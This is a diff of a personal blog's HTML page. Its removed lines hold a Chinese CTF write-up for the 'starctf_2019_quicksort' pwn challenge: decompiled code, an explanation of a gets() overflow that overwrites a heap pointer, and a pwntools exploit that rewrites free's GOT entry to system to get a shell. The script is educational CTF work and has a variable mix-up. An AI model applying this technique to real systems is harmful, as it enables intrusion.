@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>starctf_2019_quicksort | Rin</title>
+  <title>Archives | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -45,13 +45,10 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
-<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
-<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
-<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <!--
-<body class="post-template">
+<body class="home-template">
 -->
 <body id="index" class="lightnav animsition">
       <!-- ============================ Off-canvas navigation =========================== -->
@@ -75,13 +72,13 @@
 				    
 				    <li><a href="/categories/Generalization/" class="animsition-link">Generalization<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/HEAP/" class="animsition-link">HEAP<small>(1)</small></a></li>
+				    <li><a href="/categories/HEAP/" class="animsition-link">HEAP<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/HEAP-Fastbin-Attack/" class="animsition-link">HEAP - Fastbin Attack<small>(7)</small></a></li>
+				    <li><a href="/categories/HEAP-Fastbin-Attack/" class="animsition-link">HEAP - Fastbin Attack<small>(8)</small></a></li>
 				    
 				    <li><a href="/categories/HEAP-House-Of-Force/" class="animsition-link">HEAP - House Of Force<small>(3)</small></a></li>
 				    
-				    <li><a href="/categories/HEAP-Off-By-One/" class="animsition-link">HEAP - Off By One<small>(2)</small></a></li>
+				    <li><a href="/categories/HEAP-Off-By-One/" class="animsition-link">HEAP - Off By One<small>(3)</small></a></li>
 				    
 				    <li><a href="/categories/HEAP-Tcache/" class="animsition-link">HEAP - Tcache<small>(1)</small></a></li>
 				    
@@ -202,131 +199,69 @@
         <!-- ============================ Header & Logo bar =========================== -->
 
 
-      
-<section id="intro">
-    <div class="container">
-        <div class="row col-md-offset-2">
-            <div class="col-md-8">
-    			<span class="post-meta">
-      <time datetime="2022-03-31T12:04:14.000Z" itemprop="datePublished">
-          2022-03-31
-      </time>
-    
-</span>
-                <h1>starctf_2019_quicksort</h1>
+      <!-- ============================ Hero Image =========================== -->
+
+<section id="hero" class="scrollme">
+    <div class="container-fluid element-img" style="background: url(https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/cover.jpg) no-repeat center center fixed;background-size: cover">
+        <div class="row">
+            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
+                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
+                    <div>
+                        
+                        <h2><span>RIN777</span></h2>
+                        <p></p>
+                        
+                        <h2></h2>
+                        <p>努力は嘘をつく、でも無駄にはならない</p>
+                        
+
+                    </div>
+                </div>
             </div>
+            <!-- // .col-md-12 -->
         </div>
-        <div class="col-md-8 col-md-offset-2">
-      		
-    <div id="aplayer-SjZNhvUH" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
-<h2><span id="overview">overview</span></h2><p>​    <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%889.52.50.png" alt="截屏2022-03-30 下午9.52.50"></p>
-<p>libc大版本是2.23。</p>
-<h2><span id="re">re</span></h2><p>​        整体实现了一个简单的快速排序功能，在输入具体需要排序的数的时候存在溢出，但是由于开启了canary，并不是很好利用。并且num的储存其实是在堆上的，所以我以为这是个栈题，这其实是个堆题。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;how many numbers do you want to sort?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">  getchar();                                   </span><br><span class="line">  num_ptr = <span class="built_in">malloc</span>(<span class="number">4</span> * num);<span class="comment">//add num_chunk</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; num; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the %dth number:&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    gets(s);<span class="comment">//</span></span><br><span class="line">    v0 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)num_ptr + <span class="number">4</span> * i);</span><br><span class="line">    *v0 = atoi(s);<span class="comment">//将输入的num储存在num_chunk中</span></span><br><span class="line">  &#125;</span><br><span class="line">  sorting(num_ptr, <span class="number">0</span>, num - <span class="number">1</span>);<span class="comment">//不想看有没有洞的排序</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here is the result:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; num; ++j )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *((_DWORD *)num_ptr + j));<span class="comment">//输出结果</span></span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_8048AD2);<span class="comment">//看不懂有啥用。</span></span><br><span class="line">  <span class="built_in">free</span>(num_ptr);<span class="comment">//意义不大</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.06.15.png" alt="截屏2022-03-30 下午10.06.15"></p>
-<p>​        随便输点东西，堆上布局是这样。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-31%20%E4%B8%8B%E5%8D%883.03.29.png" alt="截屏2022-03-31 下午3.03.29"></p>
-<p>​        可以看到这个gets还是起了大用处的。<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-31%20%E4%B8%8B%E5%8D%883.14.36.png" alt="截屏2022-03-31 下午3.14.36"></p>
-<p>​        研究了一下，发现这里目前最大的漏洞在于储存输入num个数的变量和控制num chunk的ptr是相邻的，所以可以通过gets 将ptr覆盖成任意数,这样在输入num的时候就能够实现任意地址写。</p>
-<p>（之前看瞎眼了，还以为覆盖的只是num的size在栈上的值，以为要通过num的idx来任意地址写，太恐怖了）</p>
-<h2><span id="利用">利用</span></h2><ol>
-<li>需要至少两次malloc，以在print后继续输入payload。因为在这个阶段我们并没有leak任何的真实地址，所以考虑覆盖某个got为main addr。</li>
-<li>在leak libc后，假定能够再次输入，需要选择合适的函数来覆盖为system，条件是参数可控。（这里似乎只有free是可能的）</li>
-</ol>
-<p>​        所以第一次执行时，申请两个num，输入第一个num时覆盖num ptr为free got addr，并在payload前四位填写free got addr，输入第二个num时，此时num ptr已经为free got addr，填写main addr覆盖，接着printf leak libc，call main，进行第二次num chunk的申请，同样地将free got 覆盖为system addr。并再次覆盖num ptr为某个可写的地址，输入binsh字符串从而getshell。</p>
-<p>​        好麻。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;././starctf_2019_quicksort&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class="string">&quot;./starctf_2019_quicksort&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got_addr = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">gets_got_addr = elf.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048816</span></span><br><span class="line">addr = <span class="number">0x804b000</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;how many numbers do you want to sort?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">payload = p32(free_got_addr).ljust(<span class="number">16</span>,<span class="string">b&#x27;a&#x27;</span>)+ p32(<span class="number">2</span>) + p32(<span class="number">1</span>)*<span class="number">2</span> + p32(free_got_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;the 1th number:&quot;</span>)<span class="comment">#idx 1</span></span><br><span class="line">p.sendline(payload)<span class="comment">#overwrite num_ptr with free got addr</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;the 2th number:&quot;</span>)<span class="comment">#idx 2</span></span><br><span class="line">p.sendline(p32(main_addr))<span class="comment">#modify free_got to main addr</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Here is the result:&quot;</span>)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&quot;1&quot;</span>)[:<span class="number">4</span>])<span class="comment">#leak libc addr</span></span><br><span class="line">log.success(<span class="string">&quot;free_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_addr)))</span><br><span class="line">system_addr = free_addr - (libc.symbols[<span class="string">&#x27;free&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">log.success(<span class="string">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;how many numbers do you want to sort?&quot;</span>)<span class="comment">#ret to main again</span></span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)<span class="comment">#allocate chunk in free got addr</span></span><br><span class="line"></span><br><span class="line">payload = p32(system_addr).ljust(<span class="number">16</span>,<span class="string">b&#x27;a&#x27;</span>)+ p32(<span class="number">2</span>) + p32(<span class="number">1</span>)*<span class="number">2</span> +p32(addr)<span class="comment">#overwrite freegot with system</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;the 1th number:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;the 2th number:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>​        </p>
-<p>​        </p>
-<p>​        </p>
-<p>​</p>
-
-            <div class="clearfix"></div>
-            <hr class="nogutter">
-        </div>
-        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
-    
-    <a class="pull-left" href="../../../04/01/pwn.college_Dynamic_Allocator_Misuse/" style="float: left;">
-        ← Dynamic_Allocator_Misuse
-    </a>
-    
-    
-    <a class="pull-right" href="../../30/week5-3.1/">
-        gyctf_2020_force →
-    </a>
-    
-</nav>
-
-        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
-  /**
-   * 搜狐畅言
-   */
-
-  /*
-  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
-
-  window.onload = function () {
-    (function () {
-      var appid = 'cytXXXX';
-      var conf = 'prod_xxxxxxxxxxxxxxxxx';
-      var width = window.innerWidth || document.documentElement.clientWidth;
-      var loadJs = function (d, a, id) {
-        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
-        var b = document.createElement("script");
-        b.setAttribute("type", "text/javascript");
-        b.setAttribute("charset", "UTF-8");
-        b.setAttribute("src", d);
-        if (id) {
-          b.setAttribute("id", id);
-        }
-        if (typeof a === "function") {
-          if (window.attachEvent) {
-            b.onreadystatechange = function () {
-              var e = b.readyState;
-              if (e === "loaded" || e === "complete") {
-                b.onreadystatechange = null;
-                a()
-              }
-            }
-          } else {
-            b.onload = a
-          }
-        }
-        c.appendChild(b)
-      };
-
-      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
-        window.changyan.api.config({
-          appid: appid,
-          conf: conf
-        })
-      });
-    })();
-  }
-  */
-
-</script>
-</div>
+        <div class="herofade beige-dk"></div>
     </div>
 </section>
 
-<!-- Highlight.js -->
+<!-- Height spacing helper -->
+<div class="heightblock"></div>
+<!-- // End height spacing helper -->
 
-<link rel="stylesheet"
-href="//highlightjs.org/static/demo/styles/atom-one-light.css">
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
-</script>
-<script>
-hljs.initHighlightingOnLoad();
-
-</script>
+<!-- ============================ END Hero Image =========================== -->
 
 
+
+
+<section id="services">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1">
+                <div class="row boxes">
+                    
+                    
+                        
+                        
+                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
+                            
+                              <h4 class="title"><a href="/1919/08/10/深夜高速-1/">1</a></h4>
+                            
+                            <p><time datetime="1919-08-09T15:34:14.000Z"><a href="/1919/08/10/深夜高速-1/">1919-08-10</a></time></p>
+                        </div>
+                    
+                </div>
+            </div>    
+        </div>
+    </div>
+</section> 
+
+<section id="statement">
+    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
+        <div class="row">
+            <p>“试着开心，好吗？”</p>
+        </div>
+    </div>
+</section>
       
 <!-- ============================ Footer =========================== -->
 
